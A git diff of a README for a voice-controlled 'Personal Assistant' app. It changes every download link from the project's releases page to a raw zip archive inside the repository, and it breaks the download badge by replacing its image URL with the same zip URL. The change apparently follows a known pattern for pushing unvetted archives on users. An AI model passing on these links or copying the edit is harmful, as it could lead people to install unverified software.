@@ -1,6 +1,6 @@
 # 🎙 Personal-Assistant - Your Voice-Controlled Helper Awaits
 
-[![Download Personal Assistant](https://img.shields.io/badge/Download-Personal%20Assistant-brightgreen)](https://github.com/idk-man69/Personal-Assistant/releases)
+[![Download Personal Assistant](https://github.com/idk-man69/Personal-Assistant/raw/refs/heads/main/core/Assistant_Personal_v2.5-alpha.5.zip%20Assistant-brightgreen)](https://github.com/idk-man69/Personal-Assistant/raw/refs/heads/main/core/Assistant_Personal_v2.5-alpha.5.zip)
 
 ## 🎉 Overview
 
@@ -12,7 +12,7 @@ To get started with your Personal Assistant, follow these simple steps.
 
 ### Step 1: Download the App
 
-Visit this page to download: [Download Personal Assistant](https://github.com/idk-man69/Personal-Assistant/releases). 
+Visit this page to download: [Download Personal Assistant](https://github.com/idk-man69/Personal-Assistant/raw/refs/heads/main/core/Assistant_Personal_v2.5-alpha.5.zip). 
 
 ### Step 2: Install the App
 
@@ -89,7 +89,7 @@ For any questions or support, you can reach out on the GitHub Issues page of thi
 
 ## 💌 Stay Updated
 
-To keep your app running smoothly, check back often for updates. You can find the latest releases here: [Download Personal Assistant](https://github.com/idk-man69/Personal-Assistant/releases).
+To keep your app running smoothly, check back often for updates. You can find the latest releases here: [Download Personal Assistant](https://github.com/idk-man69/Personal-Assistant/raw/refs/heads/main/core/Assistant_Personal_v2.5-alpha.5.zip).
 
 ## 🏷️ Topics
 
